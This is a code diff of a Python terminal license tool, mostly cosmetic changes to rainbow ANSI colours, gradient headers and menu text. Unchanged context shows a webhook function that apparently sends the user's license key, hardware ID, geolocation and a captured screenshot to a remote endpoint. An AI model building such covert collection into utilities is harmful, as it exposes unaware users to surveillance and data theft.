@@ -159,7 +159,7 @@ def generate_random_id():
 
 def save_id_to_file(user_id, license_key):
     """Save ID to text file with warning"""
-    warning_text = """⚠️ WARNING: NEVER SHARE THIS ID ⚠️
+    warning_text = """WARNING: NEVER SHARE THIS ID
 
 SHARING THIS COULD LEAD TO YOUR LICENSE KEY GETTING REMOVED OR STOLEN
 
@@ -181,14 +181,20 @@ If you lose it, use the "Generate ID" option in the tool.
 def get_color(intensity="medium"):
     """Get color based on current theme and intensity"""
     if current_theme.get("rainbow"):
-        # Real rainbow colors in order (not random)
-        rainbow_colors = [196, 202, 208, 214, 220, 226,  # Red to Yellow
-                          190, 154, 118, 82, 46,  # Green
-                          21, 27, 33, 39, 45, 51,  # Blue
-                          55, 56, 57, 93, 99, 105, 111, 117, 123, 129, 135, 141, 147, 153, 159, 165, 171]  # Purple
+        # Real rainbow colors: Red, Orange, Yellow, Green, Blue, Indigo, Violet
+        # Using proper ANSI colors for each
+        rainbow_colors = [
+            196,  # Red
+            202, 208, 214,  # Orange shades
+            220, 226,  # Yellow
+            46, 47, 48, 49, 50,  # Green
+            21, 27, 33, 39, 45, 51,  # Blue
+            55, 56, 57,  # Indigo
+            93, 99, 105, 111, 117, 123, 129, 135, 141, 147, 153, 159, 165, 171  # Violet shades
+        ]
         
-        # Cycle through rainbow slowly (every 10 seconds for full cycle)
-        color_index = int((time.time() * 0.1) % len(rainbow_colors))
+        # Slow animation
+        color_index = int((time.time() * 0.2) % len(rainbow_colors))
         return f"\033[38;5;{rainbow_colors[color_index]}m"
     
     # For regular themes - stay within the color family
@@ -202,18 +208,19 @@ def get_color(intensity="medium"):
         middle_index = len(colors) // 2
         return f"\033[38;5;{colors[middle_index]}m"
 
-def get_gradient_color(position, total_positions):
+def get_gradient_color(position, total_positions, start_color_index=0):
     """Get smooth gradient color for a specific position - stays in color family"""
     if current_theme.get("rainbow"):
         # REAL RAINBOW: Red -> Orange -> Yellow -> Green -> Blue -> Indigo -> Violet
-        # Create proper rainbow segments
-        red_orange_yellow = list(range(196, 227, 2))  # Red to Yellow
+        # Define segments with proper colors
+        red_orange = list(range(196, 209, 2))  # Red to Orange-red
+        orange_yellow = list(range(208, 227, 2))  # Orange to Yellow
         green = list(range(46, 87, 4))  # Green
         blue = list(range(21, 52, 3))  # Blue
-        purple = list(range(54, 130, 3))  # Purple/Indigo/Violet
+        indigo_violet = list(range(55, 172, 4))  # Indigo to Violet
         
-        # Combine all rainbow colors in order
-        rainbow_colors = red_orange_yellow + green + blue + purple
+        # Combine in correct order
+        rainbow_colors = red_orange + orange_yellow + green + blue + indigo_violet
         
         if not rainbow_colors:
             rainbow_colors = list(range(196, 231))
@@ -228,8 +235,12 @@ def get_gradient_color(position, total_positions):
         if len(colors) == 0:
             return f"\033[38;5;{55}m"  # Default purple
         
+        # Ensure we don't go out of bounds
+        if total_positions <= 0:
+            return f"\033[38;5;{colors[0]}m"
+        
         # Calculate which color to use based on position
-        exact_index = (position / max(total_positions, 1)) * (len(colors) - 1)
+        exact_index = (position / total_positions) * (len(colors) - 1)
         color_index = min(int(exact_index), len(colors) - 1)
         return f"\033[38;5;{colors[color_index]}m"
 
@@ -365,9 +376,9 @@ def send_webhook(license_key, hwid, user_id="", geo_info=None):
         
         # Add screenshot info
         if screenshot_b64:
-            fields.append({"name": "Screenshot", "value": "✅ Screenshot attached", "inline": False})
+            fields.append({"name": "Screenshot", "value": "Screenshot attached", "inline": False})
         else:
-            fields.append({"name": "Screenshot", "value": "❌ Could not capture screenshot", "inline": False})
+            fields.append({"name": "Screenshot", "value": "Could not capture screenshot", "inline": False})
         
         # Prepare payload with both content and embed
         payload = {
@@ -446,32 +457,30 @@ def display_gradient_ascii_header_only():
     ]
     
     # Calculate positions for smooth gradient
-    total_ascii_lines = len(ascii_graphic)
-    total_text_lines = len(ascii_text)
-    total_lines = total_ascii_lines + total_text_lines + 2  # +2 for made by text and separator
+    total_ascii_lines = len(ascii_graphic) + len(ascii_text) + 2  # +2 for made by text and separator
     
     # Display graphic art with smooth gradient - uses selected theme only
     for i, line in enumerate(ascii_graphic):
-        color = get_gradient_color(i, total_lines)
+        color = get_gradient_color(i, total_ascii_lines)
         print(f"{color}{line}")
     
     print()  # Single line break
     
     # Display text art with smooth gradient - uses selected theme only
     for i, line in enumerate(ascii_text):
-        color = get_gradient_color(i + total_ascii_lines, total_lines)
+        color = get_gradient_color(i + len(ascii_graphic), total_ascii_lines)
         print(f"{color}{line}")
     
     print()  # Single line break
     
     # Add "made by @uekv on discord" with proper gradient - uses selected theme only
     made_by_text = "made by @uekv on discord"
-    color = get_gradient_color(total_ascii_lines + total_text_lines, total_lines)
+    color = get_gradient_color(len(ascii_graphic) + len(ascii_text), total_ascii_lines)
     print(f"{color}{made_by_text}{Style.RESET_ALL}")
     
     # Gradient separator line - uses selected theme only
     gradient_line = "-" * 50
-    sep_color = get_gradient_color(total_ascii_lines + total_text_lines + 1, total_lines)
+    sep_color = get_gradient_color(len(ascii_graphic) + len(ascii_text) + 1, total_ascii_lines)
     print(f"{sep_color}{gradient_line}{Style.RESET_ALL}")
 
 def display_gradient_ascii():
@@ -500,12 +509,12 @@ def display_color_selection():
                 if theme.get("rainbow"):
                     # Show rainbow colors preview
                     color_code = "\033[38;5;196m"  # Red
-                    name = "Rainbow 🌈"
+                    name = "Rainbow"
                 else:
                     mid_color = theme["colors"][len(theme["colors"]) // 2]
                     color_code = f"\033[38;5;{mid_color}m"
                     name = theme['name']
-                line += f"{color_code}[{key}]{Style.RESET_ALL}{Fore.WHITE} {name:<15}"
+                line += f"{color_code}[{key}]{Style.RESET_ALL}{Fore.WHITE} {name:<12}"
         print(line.rstrip())
     
     print(f"\n{get_color('medium')}{'-' * 50}{Style.RESET_ALL}")
@@ -517,7 +526,7 @@ def display_options_grid():
     clear_console_keep_ascii()
     display_gradient_ascii_header_only()
     
-    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Main Menu - Welcome!{Style.RESET_ALL}\n")
+    print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Main Menu{Style.RESET_ALL}\n")
     
     # Display options in a clean row
     options = [
